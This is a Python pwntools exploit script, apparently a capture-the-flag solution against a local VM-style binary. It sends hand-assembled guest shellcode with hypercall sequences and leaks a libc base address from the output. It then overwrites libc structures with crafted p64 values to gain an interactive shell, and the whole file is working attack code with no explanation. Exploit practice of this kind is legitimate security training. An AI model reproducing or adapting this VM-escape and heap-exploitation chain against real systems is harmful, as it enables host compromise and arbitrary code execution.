from pwn import *
s=process('./test')

def alloc(size):
	s.recvuntil('Your choice:')
	s.send('1')
	s.recvuntil('Size:')
	s.send(chr(size&0xff)+chr((size&0xff00)>>8))

def update(idx,pay):
	s.recvuntil('Your choice:')
	s.send('2')
	s.recvuntil('Index:')
	s.send(chr(idx))
	s.recvuntil('Content')
	s.send(pay)	

def alloc_host(size):
	s.recvuntil('Your choice:')
	s.send('4')
	s.recvuntil('Size:')
	s.send(chr(size&0xff)+chr((size&0xff00)>>8))

def update_host(size,idx,pay):
	s.recvuntil('Your choice:')
	s.send('5')
	s.recvuntil('Size:')
	s.send(chr(size&0xff)+chr((size&0xff00)>>8))
	s.recvuntil('Index:')
	s.send(chr(idx))
	s.recvuntil('Content:')
	s.send(pay)

def free_host(idx):
	s.recvuntil('Your choice:')
	s.send('6')
	s.recvuntil('Index:')
	s.send(chr(idx))
	
for i in range(10):
	alloc(0x1000)
alloc(0xf00)
alloc(0x1e5)
pay = '\x90'*0x1d0
pay+= '\xB8\x00\x00\xBB\xD0\x00\xe8\x2c\x01j\x00\xC3'
pay+= '\x90'*(0x1e5-len(pay))
update(11,pay)
pay2='h\x00\x01\x9D\xB8\x00\x01\xBB\x10\x01\x0F\x01\xC1\xB8\x00\x01\xBB\x10\x01\x0F\x01\xC1\xB8\x01\x01\xBB\x01\x00\xB9\x00\x00\x0F\x01\xC1\xB8\x02\x01\xBB\x02\x00\xB9\x00\x00\xBA\x10\x00\x0F\x01\xC1\xB8\x00@\xBB\x10\x00\xE8\xB9\x01'
pay2+='\x90'*(0xd0-len(pay2))
s.send(pay2)
for i in range(4):
	s.recvuntil('Hypercall!')
s.recv(1)
libc_base=''
for i in range(8):
	libc_base+=s.recv(1)
libc_base = u64(libc_base)-0x3c4b78
print 'libc base :',hex(libc_base)
pay3='h\x00\x01\x9D\xB8\x00\x01\xBB\x10\x01\x0F\x01\xC1\xB8\x00\x01\xBB\xA0\x00\x0F\x01\xC1\xB8\x00\x01\xBB\x10\x01\x0F\x01\xC1\xB8\x01\x01\xBB\x01\x00\xB9\x03\x00\x0F\x01\xC1\xB8\x00\x01\xBB\x10\x01\x0F\x01\xC1\xB8\x01\x01\xBB\x01\x00\xB9\x00\x00\x0F\x01\xC1\xB8\x00@\xBB\x10\x00\xE8\xBC\x01h\x00\x01\x9D\xB8\x02\x01\xBB\x01\x00\xB9\x00\x00\xBA\x10\x00\x0F\x01\xC1h\x00\x01\x9D\xB8\x00@\xBB\xA0\x00\xE8\x9C\x01h\x00\x01\x9D\xB8\x02\x01\xBB\x01\x00\xB9\x03\x00\xBA\xA0\x00\x0F\x01\xC1h\x00\x01\x9D\xB8\x00@\xBB\x10\x01\xE8|\x01h\x00\x01\x9D\xB8\x02\x01\xBB\x01\x00\xB9\x04\x00\xBA\xA0\x00\x0F\x01\xC1h\x00\x01\x9D\xB8\x00\x01\xBB\xC0\x00\x0F\x01\xC1'
pay3+='\x90'*(0xd0-len(pay3))
sleep(10)
s.send(pay3)
pay4=p64(libc_base+0x3C5520-0x10)*2
s.send(pay4)
sleep(1)
pay5=p64(0)*3+p64(1)+p64(0)+p64(libc_base+0x18CD57)
pay5+='\x00'*(0xa0-len(pay5))
s.send(pay5)
sleep(1)
pay6=p64(0)*3+p64(libc_base+0x3C34B0-0x18)+p64(0)+p64(libc_base+0x45390)
pay6+='\x00'*(0x110-len(pay6))
s.send(pay6)
s.interactive()

